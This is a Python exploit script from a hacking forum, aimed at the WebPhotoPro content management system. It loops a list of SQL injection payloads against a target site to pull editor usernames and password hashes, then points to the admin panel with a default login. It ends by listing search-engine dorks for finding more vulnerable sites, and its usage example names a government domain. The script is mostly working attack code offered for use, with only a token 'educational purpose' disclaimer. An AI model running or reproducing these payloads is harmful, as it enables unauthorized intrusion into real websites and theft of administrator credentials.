#!/usr/bin/python
# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# !!! Special thanx for d3hydr8 and rsauron who inspired me !!! 
#
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
# ---  d3hydr8 - rsauron - P47r1ck - r45c4l - C1c4Tr1Z - bennu # 
# ---  QKrun1x  - skillfaker - Croathack - Optyx - Nuclear     #
# ---  Eliminator and to all members of darkc0de and ljuska.org#                                                             #
################################################################ 


import sys, os, re, time, urllib2

if sys.platform == 'linux' or sys.platform == 'linux2':
	clearing = 'clear'
else:
	clearing = 'cls'
os.system(clearing)

if len(sys.argv) !=2:
	print "\n|---------------------------------------------------------------|"
        print "| b4ltazar[@]gmail[dot]com                                      |"
        print "|   12/2008      WebPhotoPro exploit                            |"
	print "| Help: webphotopro.py -h                                       |"
	print "| Visit www.darkc0de.com and www.ljuska.org                     |"
        print "|---------------------------------------------------------------|\n"
	sys.exit(1)
for arg in sys.argv:
	if arg == '-h' or arg == '--help' or arg == '-help':
		print "\n|---------------------------------------------------------------|"
                print "| b4ltazar[@]gmail[dot]com                                      |"
                print "|   12/2008      WebPhotoPro exploit                            |"
                print "| Usage: webphotopro.py www.site.com                            |"
	        print "| Example: python webphotopro.py  www.ere.gov.al                |"
	        print "| Visit www.darkc0de.com and www.ljuska.org                     |"
                print "|---------------------------------------------------------------|\n"
		sys.exit(1)	
vulnsql = ["art.php?idm=1'+and+1=2+union+all+select+1,2,3,4,5,6,concat_ws(char(58),username,password),8,9,10,11,12,13+from+editor/*", "rub.php?idr=1+and+1=2+union+all+select+1,2,3,4,5,6,concat_ws(char(58),username,password),8,9,10,11,12+from+editor--","rub.php?idr=1+and+1=2+union+all+select+1,2,3,concat_ws(char(58),username,password),5,6,7,8,9+from+editor--", "rub.php?idr=1+and+1=2+union+all+select+1,2,3,concat_ws(char(58),username,password),5,6,7,8,9,10+from+editor--","galeri_info.php?ida=1+and+1=2+union+all+select+1,2,3,concat_ws(char(58),username,password),5,6+from+editor/*", "galeri_info.php?ida=1+and+1=2+union+all+select+1,concat_ws(char(58),username,password),3,4,5,6,7+from+editor/*","rubrika.php?idr=1+and+1=2+union+all+select+1,concat_ws(char(58),username,password),3,4,5,6,7+from+editor--","rub.php?idr=176+and+1=2+union+all+select+1,2,3,4,5,6,concat_ws(char(58),username,password),8,9,10,11,12+from+editor/*"]

site = sys.argv[1]
if site[:4] != "http":
	site = "http://"+site
if site[-1] != "/":
	site = site + "/"
 
print "\n|---------------------------------------------------------------|"
print "| b4ltazar[@]gmail[dot]com                                      |"
print "|   12/2008      WebPhotoPro exploit                            |"
print "| Visit www.darkc0de.com and www.ljuska.org                     |"
print "|---------------------------------------------------------------|\n"
print "\n[-] %s" % time.strftime("%X")
print "\n[+] Target:",site
print "[+]",len(vulnsql),"Vulns loaded..."
print "[+] Starting Scan...\n"

for sql in vulnsql:
	
	print "[+] Checking:" ,site+sql.replace("\n","")
	print
	try:
		code = urllib2.urlopen(site+sql.replace("\n", "")).read()
		hash = re.findall("[a-f0-9]"*32,code)
		if len(hash) >=1:
			print "[w00t!w00t!]" ,site+sql.replace("\n","")
			print
			print "Admin panel: ",site+"admini/"
			print "Check for default login --> admin:demo"
			print
			
	except(urllib2.HTTPError):
			pass
	except(KeyboardInterrupt):
			pass
print
print	
print 	
print "[!!!] For more target try next dorks: "
print
print '''\t    inurl:/art.php?idm=
            intext:"Powered by WebPhotoPro"
	    inurl:/rub.php?idr=
	    inurl:/galeri_info.php?lang=
	    inurl:/galeri_info.php?l=
	    inurl:/galeri_info.php?ida=
	    inurl:/tekst.php?idt=
	    inurl:/rubrika.php?idr=
	    intext:"Powered by WebPhotoPro"  site:al'''
print
print "Check for more details:  http://packetstormsecurity.org/0808-exploits/webphotopro-sql.txt"   
print 
print "\n[-] %s" % time.strftime("%X")


